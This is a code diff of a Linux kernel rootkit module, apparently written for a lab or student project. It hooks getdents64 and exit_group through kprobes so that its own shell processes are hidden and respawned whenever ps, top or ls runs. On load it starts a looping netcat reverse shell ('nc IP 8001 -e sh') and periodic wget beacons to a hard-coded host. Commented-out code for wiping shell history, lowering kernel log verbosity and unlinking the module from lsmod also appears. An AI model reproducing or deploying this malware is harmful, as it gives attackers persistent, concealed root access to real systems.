@@ -13,10 +13,6 @@
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("tibo.wav");
 MODULE_DESCRIPTION("Hook __x64_sys_getdents64 and __x64_sys_exit_group to kill our processes and respawn them");
-MODULE_INFO(intree, "Y");
-
-static char ip_param[KSYM_NAME_LEN] = "127.0.0.1";
-module_param_string(ip, ip_param, KSYM_NAME_LEN, 0644);
 
 /* static struct kprobe kp; */
 static struct kprobe kp2;
@@ -36,25 +32,25 @@ static void find_and_kill_our_processes(void) {
 		/* pr_info("[+] Parent process: PID=%d, name=%s\n", task->real_parent->pid, task->real_parent->comm); */
         // les sh qui ont pour parent kthreadd
 		if (strcmp(task->comm, "sh") == 0 && task->real_parent && strcmp(task->real_parent->comm, "kthreadd") == 0) {
-        	/* pr_info("[+] Found process: PID=%d, name=%s\n", task->pid, task->comm); */
-			/* pr_info("[+] Parent process: PID=%d, name=%s\n", task->real_parent->pid, task->real_parent->comm); */
-			/* pr_info("[+] Killing process with PID: %d, name: %s\n", task->pid, task->comm); */
+        	pr_info("[+] Found process: PID=%d, name=%s\n", task->pid, task->comm);
+			pr_info("[+] Parent process: PID=%d, name=%s\n", task->real_parent->pid, task->real_parent->comm);
+			pr_info("[+] Killing process with PID: %d, name: %s\n", task->pid, task->comm);
 			send_sig(SIGKILL, task, 0);
 		    killed = true;	
 		}
 		// les sh qui ont pour parent sh
 		if (strcmp(task->comm, "sh") == 0 && task->real_parent && strcmp(task->real_parent->comm, "sh") == 0) {
-			/* pr_info("[+] Found process: PID=%d, name=%s\n", task->pid, task->comm); */
-			/* pr_info("[+] Parent process: PID=%d, name=%s\n", task->real_parent->pid, task->real_parent->comm); */
-			/* pr_info("[+] Killing process with PID: %d, name: %s\n", task->pid, task->comm); */
+			pr_info("[+] Found process: PID=%d, name=%s\n", task->pid, task->comm);
+			pr_info("[+] Parent process: PID=%d, name=%s\n", task->real_parent->pid, task->real_parent->comm);
+			pr_info("[+] Killing process with PID: %d, name: %s\n", task->pid, task->comm);
 			send_sig(SIGKILL, task, 0);
 			killed = true;
 		}
 		// pour les sleep
 		if (strcmp(task->comm, "sleep") == 0 && task->real_parent && strcmp(task->real_parent->comm, "sh") == 0) { 
-			/* pr_info("[+] Found process: PID=%d, name=%s\n", task->pid, task->comm); */
-			/* pr_info("[+] Parent process: PID=%d, name=%s\n", task->real_parent->pid, task->real_parent->comm); */
-			/* pr_info("[+] Killing process with PID: %d, name: %s\n", task->pid, task->comm); */
+			pr_info("[+] Found process: PID=%d, name=%s\n", task->pid, task->comm);
+			pr_info("[+] Parent process: PID=%d, name=%s\n", task->real_parent->pid, task->real_parent->comm);
+			pr_info("[+] Killing process with PID: %d, name: %s\n", task->pid, task->comm);
 			send_sig(SIGKILL, task, 0);
 			killed = true;
 		}
@@ -73,10 +69,10 @@ static void if_its_related_to_proc_we_kill(void) {
 				struct file *file = fdt->fd[i];
 				if (file) {
 					char *tmp = d_path(&file->f_path, path_buffer, PATH_MAX);
-					/* pr_info("[+] Found file: %s\n", tmp); */
+					pr_info("[+] Found file: %s\n", tmp);
 					if (tmp) {
 						if (strstr(tmp, "/proc") != NULL) {
-							/* pr_info("[+] Lets kill our process !\n"); */
+							pr_info("[+] Lets kill our process !\n");
 							find_and_kill_our_processes();
 						}
 					}
@@ -94,7 +90,7 @@ static int handler_pre2(struct kprobe *p, struct pt_regs *regs) {
 	if (killed) {
 		return 0;
 	} 
-	if (strcmp(current->comm, "ps") == 0 || strcmp(current->comm, "top") == 0 || strcmp(current->comm, "htop") == 0 ) { 
+	if (strcmp(current->comm, "ps") == 0 || strcmp(current->comm, "top") == 0) { //add htop
     	find_and_kill_our_processes();
     }
 	if (strcmp(current->comm, "ls") == 0 || strcmp(current->comm, "sh") == 0) { //sh is for the tab autocompletion 
@@ -103,32 +99,37 @@ static int handler_pre2(struct kprobe *p, struct pt_regs *regs) {
 	return 0;
 }
 
-// initiate rev shell
+// Variables globales pour IP et port
+static char *rev_ip = "192.168.1.59";
+static int rev_port = 8001;
+
+module_param(rev_ip, charp, 0644);
+MODULE_PARM_DESC(rev_ip, "IP for the reverse shell");
+
+module_param(rev_port, int, 0644);
+MODULE_PARM_DESC(rev_port, "Port for the reverse shell");
+
+// Initiate reverse shell
 static void rev_shell(void) {
-	char *shell;
-	int size = strlen("while true; do nc ") + strlen(ip_param) + strlen(" 8001 -e sh; sleep 30; done") + 1;
-	shell = kmalloc(size, GFP_KERNEL);
-	snprintf(shell, size, "while true; do nc %s 8001 -e sh; sleep 30; done", ip_param);
-	char *argv[] = {"/bin/sh", "-c", shell, NULL};
-	call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);
+    char shell[256];
+    snprintf(shell, sizeof(shell), "while true; do nc %s %d -e sh; sleep 30; done", rev_ip, rev_port);
+
+    char *argv[] = {"/bin/sh", "-c", shell, NULL};
+    call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);
 }
 
 //function to make a request every 30s
 static void make_request_periodic(void) {
-	char *str;
-	int size = strlen("while true; do wget http://") + strlen(ip_param) + strlen(":8000/UP; sleep 30; done") + 1;
-	str = kmalloc(size, GFP_KERNEL);
-	snprintf(str, size, "while true; do wget http://%s:8000/UP; sleep 30; done", ip_param);
-	char *argv[] = {"/bin/sh", "-c", str, NULL};
+	char shell[256];
+	snprintf(shell, sizeof(shell), "while true; do wget http://%s:8000/UP; sleep 30; done", rev_ip);
+	char *argv[] = {"/bin/sh", "-c", shell, NULL};
 	call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);
 }
 
 // function to make requests with a specified string
 static void make_request(char *str) {
-	char *command;
-	int size = strlen("http://") + strlen(ip_param) + strlen(":8000/") + strlen(str) + 1;
-	command = kmalloc(size, GFP_KERNEL);
-	snprintf(command, size, "http://%s:8000/%s", ip_param, str);
+	char *command = kmalloc(strlen(str) + strlen("http://") + strlen(rev_ip) + strlen(":8000/") + 1, GFP_KERNEL);
+	snprintf(command, strlen(str) + strlen("http://") + strlen(rev_ip) + strlen(":8000/") + 1, "http://%s:%d/%s", rev_ip, rev_port, str);
 	char *argv[] = {"/usr/bin/wget", command, NULL};
 	call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);
 	kfree(command);
@@ -147,23 +148,14 @@ static void my_work_handler(struct work_struct *work) {
 
 /* Fonction pour respawn nos processus */
 static void respawn_our_processes(void) {
-
-	/* // workqueue to spawn our process after they are killed */
-	/* wq = create_singlethread_workqueue("nfsio_wq"); */
-	/* if (!wq) { */
-	/* 	pr_err("[-] Failed to create workqueue\n"); */
-	/* 	return; */
-	/* } */
-
     struct work_struct *work = kmalloc(sizeof(struct work_struct), GFP_ATOMIC);
     if (!work) {
-        /* pr_err("[-] Failed to allocate memory for work_struct\n"); */
+        pr_err("[-] Failed to allocate memory for work_struct\n");
         return;
     }
-
-	INIT_WORK(work, my_work_handler);
+    INIT_WORK(work, my_work_handler);
     if (!queue_work(wq, work)) {
-        /* pr_err("[-] Failed to queue work\n"); */
+        pr_err("[-] Failed to queue work\n");
         kfree(work);
     }
 }
@@ -179,44 +171,27 @@ static int handler_pre3(struct kprobe *p, struct pt_regs *regs) {
 	return 0;
 }
 
-// Fonction pour clear les logs !!! inutile est fait par le script 
-/* static void clear_history_logs(void) { */
-/* 	char cmd[] = "sed -i '/cameleon_ultimate/d' /root/.ash_history"; */
-/* 	char *argv[] = {"/bin/sh", "-c", cmd, NULL}; */
-/* 	call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC); */
-/* } */
-
-//Desactive les logs kernel compromettants !! TROP TARD IL FAUT DESACTIVER AVANT L'INSERTION
-/* static void kernel_logs_desactivation(void) { */
-/* 	char cmd2[] = "echo '4 4 4 4' > /proc/sys/kernel/printk";	 */
-/* 	char *argv2[] = {"/bin/sh", "-c", cmd2, NULL}; */
-/* 	call_usermodehelper(argv2[0], argv2, NULL, UMH_WAIT_EXEC); */
-/* } */
-
 // Init function (called when insmod)
 static int __init hook_init(void) {
-	// desactive les logs kernel compromettants
-	/* kernel_logs_desactivation(); */
-
 	// networking start
 	make_request("START");
 	make_request_periodic();
 	rev_shell();
-	/* pr_info("[+] Hello from the other side\n"); */
+	pr_info("[+] Hello from the other side\n");
 
 	// probe getdents 
 	kp2.symbol_name = "__x64_sys_getdents64";
 	kp2.pre_handler = handler_pre2;
 	if (register_kprobe(&kp2)) {
-		/* pr_err("[-] Failed to register kprobe\n"); */
+		pr_err("[-] Failed to register kprobe\n");
 		return -1;
 	}
-	/* pr_info("[+] __x64_sys_getdents64 hooked successfully\n"); */
+	pr_info("[+] __x64_sys_getdents64 hooked successfully\n");
 
 	// workqueue to spawn our process after they are killed
-	wq = create_singlethread_workqueue("nfsio");
+	wq = create_singlethread_workqueue("nfsio_wq");
 	if (!wq) {
-		/* pr_err("[-] Failed to create workqueue\n"); */
+		pr_err("[-] Failed to create workqueue\n");
 		return -1;
 	}
 
@@ -224,16 +199,13 @@ static int __init hook_init(void) {
 	kp3.symbol_name = "__x64_sys_exit_group";
 	kp3.pre_handler = handler_pre3;
 	if (register_kprobe(&kp3)) {
-		/* pr_err("[-] Failed to register kprobe\n"); */
+		pr_err("[-] Failed to register kprobe\n");
 		return -1;
 	}
-	/* pr_info("[+] __x64_sys_exit_group hooked successfully\n"); */
-
+	pr_info("[+] __x64_sys_exit_group hooked successfully\n");
+	
 	// remove from lsmod and /proc/modules
 	//list_del(&THIS_MODULE->list); 	
-	
-	// clear logs
-	/* clear_history_logs(); */
 	return 0;
 }
 
@@ -245,7 +217,7 @@ static void __exit hook_exit(void) {
 	unregister_kprobe(&kp2);
 	unregister_kprobe(&kp3);
     destroy_workqueue(wq);	
-	/* pr_info("[+] Bye bye\n"); */
+	pr_info("[+] Bye bye\n");
 }
 
 module_init(hook_init);
